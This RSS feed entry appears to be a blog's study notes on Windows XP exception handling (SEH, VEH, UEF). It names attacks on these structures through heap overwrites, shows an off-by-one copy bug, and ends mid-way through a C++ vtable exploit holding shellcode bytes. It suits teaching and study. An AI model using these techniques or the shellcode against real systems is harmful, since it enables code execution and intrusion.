@@ -1,0 +1,731 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ExceptionHandling on Misaka's Secrect Garden</title><link>https://blog.moeomu.com/tags/exceptionhandling/</link><description>Recent content in ExceptionHandling on Misaka's Secrect Garden</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 25 Oct 2020 15:09:00 +0800</lastBuildDate><atom:link href="https://blog.moeomu.com/tags/exceptionhandling/index.xml" rel="self" type="application/rss+xml"/><item><title>Exploit learning notes 009 Windows exceptions in depth</title><link>https://blog.moeomu.com/posts/exploit-learning-notes-009-windows-exceptions-in-depth/</link><pubDate>Sun, 25 Oct 2020 15:09:00 +0800</pubDate><guid>https://blog.moeomu.com/posts/exploit-learning-notes-009-windows-exceptions-in-depth/</guid><description>&lt;p>Disclaimer: The experimental environment is Windows XP SP3&lt;/p>
+&lt;p>Source: &lt;a class="link" href="https://blog.moeomu.com/posts/exploit-learning-notes-009-windows-exceptions-in-depth/" >Moeomu&amp;rsquo;s blog&lt;/a>&lt;/p>
+&lt;h2 id="different-levels-of-seh">Different levels of SEH&lt;/h2>
+&lt;ul>
+&lt;li>The smallest scope of exception handling is threads, each thread has its own SEH chain and uses its own SEH first when an error occurs&lt;/li>
+&lt;li>There may be many threads in a process at the same time, and the process also consists of one that can handle global exception handling. When the thread&amp;rsquo;s own SEH is unable to fix the error, the process&amp;rsquo;s SEH will handle the exception. This exception handling may affect all threads under the process&lt;/li>
+&lt;li>The operating system provides a default exception handling function for all programs. When all exception handling functions are unable to handle the error, this default exception handling function will be called eventually and the result will generally be displayed when the error dialog is to be given&lt;/li>
+&lt;li>The following is a simple exception handling process
+&lt;ul>
+&lt;li>First execute the SEH or exception handling function nearest to HANDING in the thread&lt;/li>
+&lt;li>If it fails, try to execute the subsequent exception handling functions in the SEH chain in turn&lt;/li>
+&lt;li>If all the exception handling functions in the SEH chain fail to handle the exception, the exception handling of the process will be executed&lt;/li>
+&lt;li>If it still fails, the system default exception handling function will be called and the program crash dialog will pop up&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="exception-handling-for-threads">Exception handling for threads&lt;/h3>
+&lt;blockquote>
+&lt;p>Threads try to handle exceptions sequentially by referring to the SEH chain through the TEB&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>The callback function used for exception handling has 4 parameters
+&lt;ul>
+&lt;li>&lt;code>pExecpt&lt;/code>: points to an important structure: &lt;code>EXCEPTION_RECORD&lt;/code>, which contains several exception-related information, such as the type of the exception, the address where the exception occurred, etc.&lt;/li>
+&lt;li>&lt;code>pFrame&lt;/code>: points to the SEH structure in the stack frame&lt;/li>
+&lt;li>&lt;code>pContext&lt;/code>: points to the &lt;code>Context&lt;/code> structure, which contains the state of all registers&lt;/li>
+&lt;li>&lt;code>pDispatch&lt;/code>: unknown&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Before the callback function is executed, the system stacks the information about the breakpoint when the above exception occurs. With these descriptions, the callback function can easily handle exceptions&lt;/li>
+&lt;li>After the callback function returns, the operating system will decide what to do next based on the results returned. Exception handling functions can return two kinds of results
+&lt;ul>
+&lt;li>&lt;code>0(Exception Continue Excetutuon)&lt;/code>: means the exception was successfully handled and will return to the place where the exception occurred and continue to execute subsequent instructions&lt;/li>
+&lt;li>&lt;code>1(Exception Continue Search)&lt;/code>: the exception handling failed, it will search down the SEH chain for other functions that can be used for exception handling and try to handle them&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;code>UNWIND&lt;/code> operation
+&lt;ul>
+&lt;li>When an exception occurs, the OS will search the SEH chain for the handle to handle the exception, and once found, the system will call the SEH exception handling functions that have been traversed again.&lt;/li>
+&lt;li>The main purpose is to notify the previous SEHs that failed to handle the exception that the system has abandoned them and ask them to clean up the site to release resources, and then remove the SEH structure from the chain table.&lt;/li>
+&lt;li>When &lt;code>ExceptionCode&lt;/code> in the &lt;code>EXCEPTION_RECORD&lt;/code> structure pointed to by &lt;code>pExcept&lt;/code> is set to &lt;code>0xC0000027(STATUS_UNWIND)&lt;/code> and &lt;code>ExceptionFlags&lt;/code> is set to &lt;code>0x2(EH_UNWINDING)&lt;/code>, the callback function for the call is an &lt;code>unwind&lt;/code> call&lt;/li>
+&lt;li>This operation is implemented through an export function &lt;code>RtlUnwind&lt;/code> in &lt;code>kernel.32&lt;/code>.&lt;/li>
+&lt;li>Before using the callback function, the system will determine if it is currently in debug state, and if it is, it will pass the exception to the debugger&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>&lt;code>EXCEPTION_RECORD&lt;/code>&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_EXCEPTION_RECORD&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">ExceptionCode&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">ExceptionFlags&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//异常标志位
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_EXCEPTION_RECORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">ExceptionRecord&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">ExceptionAddress&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">NumberParameters&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">ExceptionInformation&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">EXCEPTION_MAXIMUM_PARAMETERS&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="n">EXCEPTION_RECORD&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>&lt;code>RtlUnwind&lt;/code>&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">RtlUnwind&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">TargetFrame&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">TargetIp&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PEXCEPTION_RECORD&lt;/span> &lt;span class="n">ExceptionRecord&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">ReturnValue&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="process-exception-handling">Process exception handling&lt;/h3>
+&lt;blockquote>
+&lt;p>All exceptions that occur in threads that are not handled by the thread or the latter debugger of the exception handling function will eventually be handed over to the process exception handling function&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>The callback function for process exception handling needs to be registered through the API function &lt;code>SetUnhandleExceptionFilter&lt;/code>.&lt;/li>
+&lt;li>There are 3 types of return values for this function
+&lt;ul>
+&lt;li>&lt;code>1(EXCEPTION_EXECUTE_HANDLER)&lt;/code>: means that the error is handled correctly and the program will exit.&lt;/li>
+&lt;li>&lt;code>0(EXCEPTION_CONTINUE_SEARCH)&lt;/code>: the error cannot be handled, and the error will be forwarded to the system default exception handling.&lt;/li>
+&lt;li>&lt;code>-1(EXCEPTION_CONTINUE_EXECUTION)&lt;/code>: indicates that the error was handled correctly and execution will continue. Similar to the threaded exception handling, the system will recover the breakpoint condition at the time of the exception with the parameters of the callback function, but by this time the register value that caused the exception should have been fixed.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>&lt;code>SetUnhandleExceptionFilter&lt;/code>&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="n">LPTOP_LEVEL_EXCEPTION_FILTER&lt;/span> &lt;span class="nf">SetUnhandledExceptionFilter&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPTOP_LEVEL_EXCEPTION_FILTER&lt;/span> &lt;span class="n">lpTopLevelExceptionFilter&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="system-default-exception-handling-uef">System default exception handling UEF&lt;/h3>
+&lt;blockquote>
+&lt;p>If the process exception handler fails or the program has no process exception handler, the system default exception handler &lt;code>UnhandledExceptionFilter()&lt;/code> will be called, which is the ultimate exception handler &lt;code>UEF(Unhandled Exception Filter)&lt;/code>.&lt;/p>
+&lt;/blockquote>
+&lt;blockquote>
+&lt;p>MSDN refers to it as the &amp;ldquo;top-level exception handler&amp;rdquo;, i.e. the top-level exception handler, or the last exception handler used&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>In &lt;code>Windows 2000- Windows XP&lt;/code>, this function will check the contents of the registry &lt;code>HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AeDebug&lt;/code>, the &lt;code>Auto&lt;/code> item identifies whether the dialog box pops up, &lt;code>1&lt;/code> means no pop up, just end the program. All others will pop up&lt;/li>
+&lt;li>The &lt;code>Debugger&lt;/code> item specifies the system default debugger&lt;/li>
+&lt;/ul>
+&lt;h3 id="summary-of-exception-flow">Summary of exception flow&lt;/h3>
+&lt;ul>
+&lt;li>CPU executes catching exceptions, kernel takes over control and starts kernel state exception handling&lt;/li>
+&lt;li>Kernel exception handling is finished and control is handed over to user state&lt;/li>
+&lt;li>The first exception handling function in the user state is the &lt;code>KiUserExceptionDispatcher()&lt;/code> function in &lt;code>ntdll.dll&lt;/code>.&lt;/li>
+&lt;li>This function first checks if the program is in debug state, and if it is debugged, gives the exception to the debugger to handle&lt;/li>
+&lt;li>Try to add &lt;code>VEH(Vectored Exception Handling)&lt;/code> to handle exceptions&lt;/li>
+&lt;li>In non-debugging state, call &lt;code>RtlDispatchException()&lt;/code> function to iterate through the thread&amp;rsquo;s SEH chain, if the callback function for handling exceptions can be found, it will again iterate through the previously called SEH handle, i.e., unwind operation, to ensure the integrity of the exception handling mechanism&lt;/li>
+&lt;li>If all the SEHs in the stack fail, the process has an exception handling function and will call this function&lt;/li>
+&lt;li>If the custom process exception handling fails, the system default UEF will be called&lt;/li>
+&lt;/ul>
+&lt;h2 id="other-exception-handling-utilization-ideas">Other exception handling utilization ideas&lt;/h2>
+&lt;h3 id="veh-utilization">VEH utilization&lt;/h3>
+&lt;blockquote>
+&lt;p>Starting from &lt;code>WindowsXP&lt;/code>, a new type of exception handling has been added: &lt;code>VEH (Vectored Exception Handler)&lt;/code> vectorized exception handling&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>VEH and process exception handling is similar, are process-based, need to use the API to register callback functions&lt;/li>
+&lt;li>Multiple VEHs can be handled, and the structures are linked in a bidirectional chain.&lt;/li>
+&lt;li>Processing priority is second to debugger processing and higher than SEH processing&lt;/li>
+&lt;li>Registering a VEH can enforce its position in the chain&lt;/li>
+&lt;li>VEHs are stored in the heap&lt;/li>
+&lt;li>unwind operation does not involve VEH process class exception handling&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>VEH structures&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="nc">_VECTORED_EXCEPTION_NODE&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">m_pNextNode&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">m_pPreviousNode&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">m_pfnVectoredHandler&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>VEH registration function&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="n">PVOID&lt;/span> &lt;span class="nf">AddVectoredExceptionHandler&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">FirstHandler&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVECTORED_EXCEPTION_HANDLER&lt;/span> &lt;span class="n">VectoredHandler&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>If the heap overflow DWORD SHOOT is used to modify the pointer to the VEH header node, it can lead the program to execute the shellcode after the exception handling starts&lt;/li>
+&lt;/ul>
+&lt;h3 id="attack-the-seh-header-node-in-the-teb">Attack the SEH header node in the TEB&lt;/h3>
+&lt;blockquote>
+&lt;p>The SEH chain of the thread points to the closest SEH to the top of the stack through the first DWORD pointer in the TEB. If this pointer in the TEB is modified, it will direct the program to execute the shellcode only when the exception occurs&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>Limitations
+&lt;ul>
+&lt;li>Multiple threads exist in a process&lt;/li>
+&lt;li>Each thread has a TEB&lt;/li>
+&lt;li>The first TEB starts at &lt;code>0x7FFDE000&lt;/code>&lt;/li>
+&lt;li>The TEB of the new thread will follow the previous TEB, separated by &lt;code>0x1000&lt;/code> bytes, growing towards the lower address of memory&lt;/li>
+&lt;li>It is difficult for multi-threaded programs to determine which thread is the current thread and where the corresponding TEB is located, and the method of attacking the SEH header node in the TEB is generally used for single-threaded programs&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>Although it is possible to create many threads or close a large number of threads to try to control the TEB arrangement, the multi-threaded state should not be obsessed with using the TEB&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="attacking-the-uef">Attacking the UEF&lt;/h3>
+&lt;blockquote>
+&lt;p>Heap overflow with DOWRD SHOOT target pointing to the entry of the UEF and data being the entry address of the shellcode, then create an exception that can only be handled by the UEF&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>Combined with the use of springboard technology can make the success rate of exploit higher&lt;/li>
+&lt;li>When an exception occurs, the EDI often points to a place in the heap that is not far from the shellcode&lt;/li>
+&lt;li>Overwriting the UEF handle with a &lt;code>CALL DWORD PTR [EDI + 0x78]&lt;/code> instruction address will often allow the program to jump into the shellcode&lt;/li>
+&lt;li>or &lt;code>CALL DWORD PTR [ESI + 0x4C]&lt;/code> or &lt;code>CALL DWORD PTR [EBP + 0x74]&lt;/code> will work&lt;/li>
+&lt;/ul>
+&lt;h3 id="attack-the-function-pointer-in-peb">Attack the function pointer in PEB&lt;/h3>
+&lt;ul>
+&lt;li>ExitProcess() then needs to enter the critical section to synchronize the threads when cleaning up the scene, and will eventually call RtlEnterCriticalSection() and RtlLeaceCriticalSection()&lt;/li>
+&lt;li>The address of the PEB is always the same, which is a better choice than the TEB&lt;/li>
+&lt;/ul>
+&lt;h2 id="off-by-one-exploit">&lt;code>off by one&lt;/code> exploit&lt;/h2>
+&lt;blockquote>
+&lt;p>Hierarchy of exploit techniques.&lt;/p>
+&lt;ul>
+&lt;li>Basic stack overflow exploit: hijacking the process with the return address&lt;/li>
+&lt;li>Advanced stack overflow exploits: exploits that can only partially flood the EBP but cannot reach the return address, such as the &lt;code>off by one&lt;/code> exploit that occurs when the strncpy function is misused&lt;/li>
+&lt;li>Heap overflow and format string exploits&lt;/li>
+&lt;/ul>
+&lt;/blockquote>
+&lt;h3 id="exploits">Exploits&lt;/h3>
+&lt;blockquote>
+&lt;p>Code snippet&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">off_by_one&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>This function tries to prevent array overruns during string copying, but the loop &lt;code>i &amp;lt;= len&lt;/code> goes wrong in the boundary control and may overflow by one byte&lt;/li>
+&lt;li>We can control EBP in the range of 255 bytes and possibly some important parameters of the program&lt;/li>
+&lt;/ul>
+&lt;h2 id="attacking-c-virtual-functions">Attacking C++ virtual functions&lt;/h2>
+&lt;h3 id="theory">Theory&lt;/h3>
+&lt;ul>
+&lt;li>A member function of a C++ class is a virtual function if it is modified with the virtual keyword when it is declared&lt;/li>
+&lt;li>A class may consist of many virtual functions&lt;/li>
+&lt;li>The entry address of the virtual function is stored in the virtual table (Vtable).&lt;/li>
+&lt;li>When an object uses a virtual function, it first finds the virtual table by using the virtual table pointer, and then takes the final function entry address from the virtual table to call it&lt;/li>
+&lt;li>The pointer to the virtual table is stored in the object&amp;rsquo;s memory space, followed by other member variables&lt;/li>
+&lt;li>Dummy functions can only be called dynamically by reference to an object pointer&lt;/li>
+&lt;/ul>
+&lt;h3 id="try">Try&lt;/h3>
+&lt;ul>
+&lt;li>When a member variable in an object overflows, there is an opportunity to modify the virtual table pointer in the object or modify the virtual function pointer in the virtual table&lt;/li>
+&lt;li>This makes it possible to execute shellcode&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>code attempts&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">Test on Windows XP SP3 without any other patch.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">*/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;#34;windows.h&amp;#34;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;#34;iostream.h&amp;#34;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
